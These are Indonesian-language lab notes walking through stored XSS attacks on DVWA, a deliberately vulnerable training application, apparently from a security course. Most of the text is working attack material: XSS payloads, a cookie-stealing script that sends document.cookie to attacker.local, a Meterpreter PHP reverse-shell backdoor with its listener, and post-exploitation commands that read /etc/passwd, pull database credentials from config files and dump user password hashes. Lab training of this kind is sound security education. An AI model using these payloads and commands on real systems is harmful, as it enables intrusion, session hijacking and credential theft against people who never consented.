---
title: XSS
updated: 2025-12-17 04:40:06Z
created: 2025-12-17 01:00:45Z
latitude: -6.20239360
longitude: 106.65270990
altitude: 0.0000
---

# XSS

## Tujuan

- Test a basic cross site scripting (XSS) attack
- Test an iframe cross site scripting (XSS) attack
- Test a cookie cross site scripting (XSS) attack
- Create a php/meterpreter/reverse_tcp payload
- Start the php/meterpreter/reverse_tcp listener
- Upload the PHP payload to the DVWA Upload screen
- Test a PHP Payload cross site scripting (XSS) attack

## Di sisi DVWA

### Cek IP

```
ifconfig
```

### Fix Stored Cross Site Scripting (XSS) Comment Box

Edit index.php

```
cd /var/www/html/DVWA-1.9/vulnerabilities/xss_s/
vi index.php
```

Search dengan keyword mtxMessage Ubah maxlength=50

&lt;textarea name=\\"mtxMessage\\" cols=\\"50\\" rows=\\"3\\" maxlength=\\"50\\"&gt;&lt;/textarea&gt;

menjadi maxlength=250

&lt;textarea name=\\"mtxMessage\\" cols=\\"50\\" rows=\\"3\\" maxlength=\\"250\\"&gt;&lt;/textarea&gt;

## Di sisi Kali Linux

### Cek IP Kali Linux

```
ifconfig -a
```

### Enable Javascript di Browser

```
Buka Firefox
Preferences > Content > Uncheck - Block pop-up windows
```

### Masuk ke DVWA

- Login
- DVWA Security > Low

## XSS Stored Basic Exploit Test

- Klik > XSS (Stored)
- Name > "Test 1"
- Message > "&lt;script&gt;alert("This is a XSS Exploit Test")&lt;/script&gt;"
- Klik > Sign Guestbook

## XSS Stored IFRAME Exploit Test

- Reset Database DVWA, supaya XSS yang pernah dilakukan tidak muncul lagi.
- Klik > XSS (Stored)
- Nama > "Test 2"
- Message > "&lt;/iframe&gt;"
- Klik > Sign Guestbook

Tampak bahwa CNN muncul di bawah "Test 2" . Teknik ini menjadi exploit yang sangat powerful yang dapat digunakan dalam Social Engineering Toolkit (SET) untuk cloning web.

## XSS Stored COOKIE Exploit Test

- Reset Database DVWA, supaya XSS yang pernah dilakukan tidak muncul lagi.
- Klik > XSS (Stored)
- Nama > "Test 3"
- Message > "&lt;script&gt;alert(document.cookie)&lt;/script&gt;"
- Klik > Sign Guestbook

Akibatnya cookie/session yang digunakan untuk hubungan komunikasi dengan webserver dapat diambil. Attacker dapat memodifikasi XSS script ini untuk mengirimkan cookie ke lokasi remote, bukan menampilkannya. Bayangkan jika ini sebuah situs bank online, setiap kali user login & informasi cookie dikirim ke lokasi remote untuk di manfaatkan.

## Build PHP msfpayload

Membuat PHP backdoor

```
mkdir -p /root/backdoor
cd /root/backdoor
msfpayload php/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=4444 R > FORUM_BUG.php
ls -l FORUM_BUG.php
```

Pilih "Upload" di menu navigasi di bagian kiri DVWA.

### Start msfconsole

Jalankan

```
msfconsole
```

Exploit

```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.105
set LPORT 4444
exploit
```

## XSS Stored window.location Exploit Test

- Reset Database DVWA, supaya XSS yang pernah dilakukan tidak muncul lagi.
- Klik > XSS (Stored)
- Name > "Test 4"
- Message > "&lt;script&gt;window.location="http://192.168.0.100/DVWA-1.9/hackable/uploads/FORUM_BUG.php" &lt;/script&gt;"

Ubah 192.168.0.100 dengan IP DVWA anda.

- Klik > Sign Guestbook
- Klik OK saat Test 1 Message di tampilkan.

Beberapa perintah yang menarik

```
shell
   membuka shell "sh"
```

```
tail /etc/passwd
   melihat username yang ada di mesin sasaran untuk ssh brute force attack.
```

```
whoami
   display nama user.
```

```
grep apache /etc/passwd
   memperoleh home directory dari username apache.
```

```
find /var/www/* -print | grep config
   mencari semua file konfigurasi di directory /var/www
```

```
grep "db_" /var/www/html/dvwa/config/config.inc.php
   melihat informasi nama database, username, dan password untuk akses ke database mysql.
```

```
echo "use dvwa; show tables;" | mysql -uroot -p123456
   melihat daftar tabel dari dvwa database
```

```
echo "use dvwa; desc users;" | mysql -uroot -p123456
   melihat kolom yang ada di tabel users di database dvwa.
```

```
echo "select user,password from dvwa.users;" | mysql -uroot -p123456
   melihat informasi user dan password untuk setiap user yang ada di tabel dvwa.users
```

### Bukti

```
echo "< pre >" >> /var/www/html/dvwa/hackable/uploads/xss.html
   letakan html < pre > tag di file xss.html
   < pre > digunakan untuk pre-formatter.
```

```
echo "select user,password from dvwa.users;" | mysql -uroot -p123456 >> /var/www/html/dvwa/hackable/uploads/xss.html
   letakan user dan password untuk tabel dvwa.users di file the xss.html
```

```
echo "< /pre >" >> /var/www/html/dvwa/hackable/uploads/xss.html
   letakan < /pre > tag di file xss.html
```

```
echo "< br >Your Name< br >" >> /var/www/html/dvwa/hackable/uploads/xss.html
   letakan string "Your Name" dengan naman anda sebenarnya
```

```
date >> /var/www/html/dvwa/hackable/uploads/xss.html
```

Pastikan &lt; pre &gt; , &lt; /pre &gt;, &lt; br &gt;, &lt; /br &gt; dibuang spasinya.

### Di Kali Linux

Web dengan alamat

```
http://192.168.0.100/DVWA-1.9/hackable/uploads/xss.html
```

IP 192.168.0.100 di ganti dengan IP DVWA server

&nbsp;

&lt;script&gt;location='[http://attacker.local/?c='+document.cookie&lt;/script&gt;](http://attacker.local/?c=%27+document.cookie&lt;/script&gt "http://attacker.local/?c='+document.cookie&lt;/script&gt");

Dengan cookie session:

- Penyerang bisa **session hijacking**
    
- Login sebagai korban
    
- Account Takeover
    

## Referensi

- http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson9/index.html